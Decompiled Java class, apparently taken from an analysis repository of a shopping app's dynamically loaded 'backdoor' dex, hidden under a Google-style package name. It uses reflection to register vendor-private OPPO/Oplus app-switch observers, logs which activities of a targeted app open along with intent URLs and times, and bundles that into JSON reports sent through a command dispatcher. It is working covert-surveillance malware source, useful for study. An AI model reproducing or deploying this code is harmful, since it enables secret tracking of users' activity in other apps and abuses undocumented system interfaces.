package com.google.android.sd.biz_dynamic_dex.td.logcat.d;

import android.content.Context;
import android.os.Build;
import android.text.TextUtils;
import com.color.app.ColorAppEnterInfo;
import com.color.app.ColorAppExitInfo;
import com.color.app.ColorAppSwitchConfig;
import com.color.app.IColorAppSwitchObserver;
import com.google.android.sd.biz_dynamic_dex.td.logcat.a.a.a;
import com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.a;
import com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b;
import com.google.android.sd.biz_dynamic_dex.td.logcat.c.a.b;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import com.oplus.app.IOplusAppSwitchObserver;
import com.oplus.app.OplusAppEnterInfo;
import com.oplus.app.OplusAppExitInfo;
import com.oplus.app.OplusAppSwitchConfig;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import org.json.JSONArray;
import org.json.JSONObject;

public final class a implements a.a, a.a {
  private static final Map<String, String> a = new HashMap<String, String>();
  
  private static final Map<String, String> b = new HashMap<String, String>();
  
  private Context c;
  
  private com.google.android.sd.biz_dynamic_dex.td.logcat.c.a.a d;
  
  private String e;
  
  private final List<b> f = new LinkedList<b>();
  
  private Object g;
  
  private OplusAppSwitchConfig h;
  
  private Object i;
  
  private ColorAppSwitchConfig j;
  
  public a(Context paramContext, String paramString) {
    try {
      this.c = paramContext;
      this.d = com.google.android.sd.biz_dynamic_dex.td.logcat.c.a.a.a(paramString);
      Map<String, String> map = a;
      map.put("onActivityEnter", "com.oplus.app.OplusAppEnterInfo");
      map.put("onActivityExit", "com.oplus.app.OplusAppExitInfo");
      map.put("onAppEnter", "com.oplus.app.OplusAppEnterInfo");
      map.put("onAppExit", "com.oplus.app.OplusAppExitInfo");
      map = b;
      map.put("onActivityEnter", "com.color.app.ColorAppEnterInfo");
      map.put("onActivityExit", "com.color.app.ColorAppExitInfo");
      map.put("onAppEnter", "com.color.app.ColorAppEnterInfo");
      map.put("onAppExit", "com.color.app.ColorAppExitInfo");
      return;
    } catch (Exception exception) {
      c("impl_init_fail");
      return;
    } 
  }
  
  private void a(boolean paramBoolean) {
    // Byte code:
    //   0: aload_0
    //   1: monitorenter
    //   2: ldc 'impl_unregister_clear_'
    //   4: iload_1
    //   5: invokestatic valueOf : (Z)Ljava/lang/String;
    //   8: invokevirtual concat : (Ljava/lang/String;)Ljava/lang/String;
    //   11: invokestatic a : (Ljava/lang/String;)V
    //   14: aload_0
    //   15: getfield g : Ljava/lang/Object;
    //   18: astore_2
    //   19: aload_2
    //   20: ifnull -> 115
    //   23: ldc 'impl_unregister_oplus'
    //   25: invokestatic a : (Ljava/lang/String;)V
    //   28: aload_0
    //   29: getfield g : Ljava/lang/Object;
    //   32: invokevirtual getClass : ()Ljava/lang/Class;
    //   35: ldc 'unregisterAppSwitchObserver'
    //   37: iconst_2
    //   38: anewarray java/lang/Class
    //   41: dup
    //   42: iconst_0
    //   43: ldc java/lang/String
    //   45: aastore
    //   46: dup
    //   47: iconst_1
    //   48: ldc com/oplus/app/OplusAppSwitchConfig
    //   50: aastore
    //   51: invokevirtual getDeclaredMethod : (Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    //   54: aload_0
    //   55: getfield g : Ljava/lang/Object;
    //   58: iconst_2
    //   59: anewarray java/lang/Object
    //   62: dup
    //   63: iconst_0
    //   64: aload_0
    //   65: getfield c : Landroid/content/Context;
    //   68: invokevirtual getPackageName : ()Ljava/lang/String;
    //   71: aastore
    //   72: dup
    //   73: iconst_1
    //   74: aload_0
    //   75: getfield h : Lcom/oplus/app/OplusAppSwitchConfig;
    //   78: aastore
    //   79: invokevirtual invoke : (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   82: pop
    //   83: aload_0
    //   84: aconst_null
    //   85: putfield g : Ljava/lang/Object;
    //   88: aload_0
    //   89: aconst_null
    //   90: putfield h : Lcom/oplus/app/OplusAppSwitchConfig;
    //   93: goto -> 211
    //   96: astore_2
    //   97: ldc 'impl_listen_activity_change_fail: '
    //   99: aload_2
    //   100: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   103: invokevirtual concat : (Ljava/lang/String;)Ljava/lang/String;
    //   106: astore_2
    //   107: aload_0
    //   108: aload_2
    //   109: invokespecial c : (Ljava/lang/String;)V
    //   112: goto -> 211
    //   115: aload_0
    //   116: getfield i : Ljava/lang/Object;
    //   119: astore_2
    //   120: aload_2
    //   121: ifnull -> 211
    //   124: ldc 'impl_unregister_color'
    //   126: invokestatic a : (Ljava/lang/String;)V
    //   129: aload_0
    //   130: getfield i : Ljava/lang/Object;
    //   133: invokevirtual getClass : ()Ljava/lang/Class;
    //   136: ldc 'unregisterAppSwitchObserver'
    //   138: iconst_2
    //   139: anewarray java/lang/Class
    //   142: dup
    //   143: iconst_0
    //   144: ldc java/lang/String
    //   146: aastore
    //   147: dup
    //   148: iconst_1
    //   149: ldc com/color/app/ColorAppSwitchConfig
    //   151: aastore
    //   152: invokevirtual getDeclaredMethod : (Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    //   155: aload_0
    //   156: getfield i : Ljava/lang/Object;
    //   159: iconst_2
    //   160: anewarray java/lang/Object
    //   163: dup
    //   164: iconst_0
    //   165: aload_0
    //   166: getfield c : Landroid/content/Context;
    //   169: invokevirtual getPackageName : ()Ljava/lang/String;
    //   172: aastore
    //   173: dup
    //   174: iconst_1
    //   175: aload_0
    //   176: getfield j : Lcom/color/app/ColorAppSwitchConfig;
    //   179: aastore
    //   180: invokevirtual invoke : (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   183: pop
    //   184: aload_0
    //   185: aconst_null
    //   186: putfield i : Ljava/lang/Object;
    //   189: aload_0
    //   190: aconst_null
    //   191: putfield j : Lcom/color/app/ColorAppSwitchConfig;
    //   194: goto -> 211
    //   197: astore_2
    //   198: ldc 'impl_listen_activity_change_fail: '
    //   200: aload_2
    //   201: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   204: invokevirtual concat : (Ljava/lang/String;)Ljava/lang/String;
    //   207: astore_2
    //   208: goto -> 107
    //   211: iload_1
    //   212: ifeq -> 224
    //   215: aload_0
    //   216: getfield f : Ljava/util/List;
    //   219: invokeinterface clear : ()V
    //   224: invokestatic a : ()V
    //   227: aload_0
    //   228: getfield c : Landroid/content/Context;
    //   231: invokestatic a : (Landroid/content/Context;)V
    //   234: invokestatic b : ()V
    //   237: aload_0
    //   238: monitorexit
    //   239: return
    //   240: astore_2
    //   241: invokestatic b : ()V
    //   244: aload_2
    //   245: athrow
    //   246: invokestatic b : ()V
    //   249: aload_0
    //   250: monitorexit
    //   251: return
    //   252: astore_2
    //   253: aload_0
    //   254: monitorexit
    //   255: aload_2
    //   256: athrow
    //   257: astore_2
    //   258: goto -> 246
    // Exception table:
    //   from	to	target	type
    //   2	19	257	java/lang/Exception
    //   2	19	240	finally
    //   23	93	96	java/lang/Exception
    //   23	93	240	finally
    //   97	107	257	java/lang/Exception
    //   97	107	240	finally
    //   107	112	257	java/lang/Exception
    //   107	112	240	finally
    //   115	120	257	java/lang/Exception
    //   115	120	240	finally
    //   124	194	197	java/lang/Exception
    //   124	194	240	finally
    //   198	208	257	java/lang/Exception
    //   198	208	240	finally
    //   215	224	257	java/lang/Exception
    //   215	224	240	finally
    //   224	234	257	java/lang/Exception
    //   224	234	240	finally
    //   234	237	252	finally
    //   241	246	252	finally
    //   246	249	252	finally
  }
  
  private boolean a(List<String> paramList) {
    try {
      if (b("com.oplus.app.IOplusAppSwitchObserver")) {
        boolean bool = b(paramList);
        com.google.android.sd.biz_dynamic_dex.base.a.b();
        return bool;
      } 
      if (b("com.color.app.IColorAppSwitchObserver")) {
        boolean bool = c(paramList);
        com.google.android.sd.biz_dynamic_dex.base.a.b();
        return bool;
      } 
      c("impl_no_valid_method");
      com.google.android.sd.biz_dynamic_dex.base.a.b();
      return false;
    } catch (Exception exception) {
      c("impl_register_error_".concat(String.valueOf(exception)));
      com.google.android.sd.biz_dynamic_dex.base.a.b();
      return false;
    } finally {}
    com.google.android.sd.biz_dynamic_dex.base.a.b();
    throw paramList;
  }
  
  private static boolean b(String paramString) {
    Map<String, String> map;
    if (TextUtils.equals(paramString, "com.oplus.app.IOplusAppSwitchObserver")) {
      map = a;
    } else {
      map = b;
    } 
    try {
      Method[] arrayOfMethod = Class.forName(paramString).getDeclaredMethods();
      if (arrayOfMethod.length != map.size())
        return false; 
      if (Build.VERSION.SDK_INT < 26)
        return false; 
      int j = arrayOfMethod.length;
      for (int i = 0; i < j; i++) {
        Method method = arrayOfMethod[i];
        String str = map.get(method.getName());
        if (TextUtils.isEmpty(str))
          return false; 
        if (!TextUtils.equals(method.getReturnType().getName(), "void"))
          return false; 
        if (method.getParameterCount() != 1)
          return false; 
        Class[] arrayOfClass = method.getParameterTypes();
        int m = arrayOfClass.length;
        for (int k = 0; k < m; k++) {
          boolean bool = TextUtils.equals(arrayOfClass[k].getName(), str);
          if (!bool)
            return false; 
        } 
      } 
      return true;
    } catch (Exception exception) {
      return false;
    } 
  }
  
  private boolean b(List<String> paramList) {
    try {
      Class<?> clazz = Class.forName("android.app.OplusActivityManager");
      Method method = clazz.getDeclaredMethod("registerAppSwitchObserver", new Class[] { String.class, IOplusAppSwitchObserver.class, OplusAppSwitchConfig.class });
      this.g = clazz.newInstance();
      OplusAppSwitchConfig oplusAppSwitchConfig2 = new OplusAppSwitchConfig();
      this.h = oplusAppSwitchConfig2;
      oplusAppSwitchConfig2.addAppConfig(2, null);
      this.h.addAppConfig(1, paramList);
      OplusAppSwitchConfig oplusAppSwitchConfig1 = this.h;
      oplusAppSwitchConfig1.observerFingerPrint = oplusAppSwitchConfig1.hashCode();
      method.invoke(this.g, new Object[] { this.c.getPackageName(), new IOplusAppSwitchObserver.Stub(this) {
              public final void onActivityEnter(OplusAppEnterInfo param1OplusAppEnterInfo) {
                try {
                  com.google.android.sd.biz_dynamic_dex.base.a.c();
                  if (param1OplusAppEnterInfo != null && param1OplusAppEnterInfo.intent != null) {
                    String str2 = param1OplusAppEnterInfo.targetName;
                    String str1 = param1OplusAppEnterInfo.intent.getDataString();
                    a.a(this.a, str2, str1);
                  } 
                  return;
                } catch (Exception exception) {
                  StringBuilder stringBuilder = new StringBuilder("impl_oae_error_");
                  stringBuilder.append(exception.getMessage());
                  b.a(stringBuilder.toString());
                  return;
                } 
              }
              
              public final void onActivityExit(OplusAppExitInfo param1OplusAppExitInfo) {
                com.google.android.sd.biz_dynamic_dex.base.a.c();
              }
              
              public final void onAppEnter(OplusAppEnterInfo param1OplusAppEnterInfo) {
                com.google.android.sd.biz_dynamic_dex.base.a.c();
              }
              
              public final void onAppExit(OplusAppExitInfo param1OplusAppExitInfo) {
                com.google.android.sd.biz_dynamic_dex.base.a.c();
              }
            }, this.h });
      return true;
    } catch (Exception exception) {
      c("impl_listen_activity_change_fail: ".concat(String.valueOf(exception)));
      return false;
    } 
  }
  
  private void c(String paramString) {
    a.a(this.c, paramString);
  }
  
  private boolean c(List<String> paramList) {
    try {
      Class<?> clazz = Class.forName("android.app.OppoActivityManager");
      Method method = clazz.getDeclaredMethod("registerAppSwitchObserver", new Class[] { String.class, IColorAppSwitchObserver.class, ColorAppSwitchConfig.class });
      this.i = clazz.newInstance();
      ColorAppSwitchConfig colorAppSwitchConfig2 = new ColorAppSwitchConfig();
      this.j = colorAppSwitchConfig2;
      colorAppSwitchConfig2.addAppConfig(2, null);
      this.j.addAppConfig(1, paramList);
      ColorAppSwitchConfig colorAppSwitchConfig1 = this.j;
      colorAppSwitchConfig1.observerFingerPrint = colorAppSwitchConfig1.hashCode();
      method.invoke(this.i, new Object[] { this.c.getPackageName(), new IColorAppSwitchObserver.Stub(this) {
              public final void onActivityEnter(ColorAppEnterInfo param1ColorAppEnterInfo) {
                try {
                  com.google.android.sd.biz_dynamic_dex.base.a.c();
                  if (param1ColorAppEnterInfo != null && param1ColorAppEnterInfo.intent != null) {
                    String str2 = param1ColorAppEnterInfo.targetName;
                    String str1 = param1ColorAppEnterInfo.intent.getDataString();
                    a.a(this.a, str2, str1);
                  } 
                  return;
                } catch (Exception exception) {
                  StringBuilder stringBuilder = new StringBuilder("impl_oae_error_");
                  stringBuilder.append(exception.getMessage());
                  b.a(stringBuilder.toString());
                  return;
                } 
              }
              
              public final void onActivityExit(ColorAppExitInfo param1ColorAppExitInfo) {
                com.google.android.sd.biz_dynamic_dex.base.a.c();
              }
              
              public final void onAppEnter(ColorAppEnterInfo param1ColorAppEnterInfo) {
                com.google.android.sd.biz_dynamic_dex.base.a.c();
              }
              
              public final void onAppExit(ColorAppExitInfo param1ColorAppExitInfo) {
                com.google.android.sd.biz_dynamic_dex.base.a.c();
              }
            }, this.j });
      return true;
    } catch (Exception exception) {
      c("impl_listen_activity_change_fail: ".concat(String.valueOf(exception)));
      return false;
    } 
  }
  
  public final void a(Context paramContext) {
    try {
      a.f(paramContext, this.d.a);
      a(false);
      return;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder("impl_on_proguard_error_");
      stringBuilder.append(exception.getMessage());
      c(stringBuilder.toString());
      return;
    } 
  }
  
  public final void a(String paramString) {
    try {
      String str1;
      b.a("impl_report");
      String str2 = com.google.android.sd.biz_dynamic_dex.td.logcat.c.a.c(paramString);
      CmdData cmdData = new CmdData(36799, str2, "client");
      b.a("uuid_".concat(String.valueOf(str2)));
      StringBuilder stringBuilder = new StringBuilder("data_size_");
      stringBuilder.append(this.f.size());
      b.a(stringBuilder.toString());
      JSONObject jSONObject1 = new JSONObject();
      jSONObject1.put("mode", 100);
      jSONObject1.put("version", this.e);
      JSONArray jSONArray = new JSONArray();
      for (b b : this.f) {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("name", b.a);
        b.a a1 = b.b;
        if (a1 != null) {
          JSONObject jSONObject3 = new JSONObject();
          jSONObject3.put("url", a1.a);
          jSONObject.put("intent", jSONObject3);
        } 
        jSONObject.put("time", b.c);
        jSONArray.put(jSONObject);
      } 
      boolean bool = this.f.isEmpty();
      JSONObject jSONObject2 = new JSONObject();
      jSONObject2.put("config", jSONObject1);
      if (!bool)
        jSONObject2.put("data", jSONArray); 
      cmdData = Utils.buildSucceedRespData(cmdData, jSONObject2, null);
      CmdHandler.dispatch(this.c, cmdData);
      Context context = this.c;
      if (bool) {
        str1 = "6";
      } else {
        str1 = "5";
      } 
      a.b(context, str1);
      return;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder("impl_report_error_");
      stringBuilder.append(exception.getMessage());
      c(stringBuilder.toString());
      return;
    } 
  }
  
  public final boolean a() {
    try {
      b.a("impl_start");
      if (this.c == null) {
        c("impl_invalid_context");
        return false;
      } 
      if (this.g != null || this.i != null) {
        c("impl_is_working");
        return false;
      } 
      com.google.android.sd.biz_dynamic_dex.td.logcat.c.a.a a1 = this.d;
      if (a1 == null) {
        c("impl_data_is_null");
        return false;
      } 
      String str = a1.b;
      if (TextUtils.isEmpty(str)) {
        c("impl_package_name_is_null");
        return false;
      } 
      if (!a.c(this.c, str)) {
        c("impl_app_has_uninstall");
        return false;
      } 
      this.e = a.e(this.c, str);
      List<String> list = this.d.c;
      if (list == null || list.isEmpty()) {
        c("impl_target_as_value_empty");
        return false;
      } 
      return a(list);
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder("impl_start_error_");
      stringBuilder.append(exception.getMessage());
      c(stringBuilder.toString());
      return false;
    } 
  }
  
  public final void b() {
    try {
      b.a("impl_stop");
      a(true);
      return;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder("impl_stop_error_");
      stringBuilder.append(exception.getMessage());
      c(stringBuilder.toString());
      return;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\2aa151e2cfa04acb8fb96e523807ca6b-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\td\logcat\d\a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */